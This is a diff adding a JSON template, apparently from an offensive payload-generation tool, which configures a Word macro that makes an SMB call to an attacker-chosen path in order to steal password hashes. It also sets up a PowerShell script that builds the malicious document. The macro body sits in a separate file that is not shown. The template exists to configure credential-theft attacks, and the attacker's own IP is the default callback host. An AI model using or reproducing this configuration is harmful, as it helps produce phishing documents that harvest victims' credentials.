@@ -1,0 +1,35 @@
+
+
+{
+    "categories" : ["SMB","Word"],
+    "description" : "Calls back to IEX Makes an SMB call from the Macro to steal hashes.",
+    "contentFile" : "wordhashstealmacro.txt",
+    
+    "customAttributes" : [
+        {
+            "name":"smbPath",
+            "description" : "The SMB path to reach out to.",
+            "defaultValue" : "\\\\[[[[ownIP]]]]\\Share\\Path\\"   
+        }
+    ],
+
+    "shellCode" : {
+        "hasShellCode":false
+    },
+    "compilation": {
+        "compilationType": "macro",
+        "compilationAttributes": [
+          {
+            "name": "saveAs",
+            "description": "Name of the powershell file to be created, can be full path or just a name",
+            "defaultValue": "gendoc.ps1"
+          },
+          {
+            "name": "wordDocOut",
+            "description": "Name of the word doc file to be created by the powershell script.",
+            "defaultValue": "doc.doc"
+          }
+        ]
+      },
+      "runHint" : "If wordDocOut is relative it it'll end up in the current users documents folder."
+}
